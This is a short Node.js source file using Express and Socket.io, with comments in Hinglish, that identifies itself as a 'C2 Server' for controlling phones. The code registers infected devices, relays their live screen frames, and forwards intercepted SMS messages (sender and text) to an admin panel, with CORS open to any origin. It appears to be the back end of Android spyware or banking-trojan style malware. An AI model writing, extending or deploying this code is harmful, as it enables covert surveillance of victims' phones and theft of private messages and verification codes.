const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Basic route check karne ke liye ki server live hai ya nahi
app.get('/', (req, res) => {
    res.send('C2 Server is running successfully!');
});

io.on('connection', (socket) => {
    console.log(`[+] New connection: ${socket.id}`);

    // Device register hone par
    socket.on('register_device', (deviceName) => {
        console.log(`[!] Device Registered: ${deviceName} (${socket.id})`);
        socket.broadcast.emit('device_connected', { id: socket.id, name: deviceName });
    });

    // Screen streaming frame receive karke admin panel ko bhejna
    socket.on('screen_frame', (frameData) => {
        io.emit('live_frame', frameData);
    });

    // Phone se SMS aane par receive karke admin panel ko bhejna
    socket.on('sms_data', (data) => {
        console.log(`[!] SMS Received from ${data.sender}: ${data.message}`);
        io.emit('new_sms', data);
    });

    // Jab connection toot jaye
    socket.on('disconnect', () => {
        console.log(`[-] Disconnected: ${socket.id}`);
        io.emit('device_disconnected', socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
